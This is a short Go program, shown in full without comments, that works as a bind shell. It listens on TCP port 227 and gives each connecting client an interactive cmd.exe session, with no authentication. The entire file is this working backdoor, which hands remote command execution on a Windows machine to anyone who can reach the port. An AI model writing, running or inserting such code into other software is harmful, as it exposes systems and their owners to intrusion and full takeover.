package main

import (
	"io"
	"log"
	"net"
	"os/exec"
)

func main() {
	l, err := net.Listen("tcp", ":227")
	if err != nil {
		log.Fatalln(err)
	}

	for {
		c, err := l.Accept()
		if err != nil {
			log.Fatalln(err)
		}

		go handle(c)
	}
}

func handle(c net.Conn) {
	defer c.Close()
	cmd := exec.Command("cmd.exe")

	rp, wp := io.Pipe()

	cmd.Stdin = c
	cmd.Stdout = wp

	go io.Copy(c, rp)

	if err := cmd.Run(); err != nil {
		log.Println(err)
	}
}
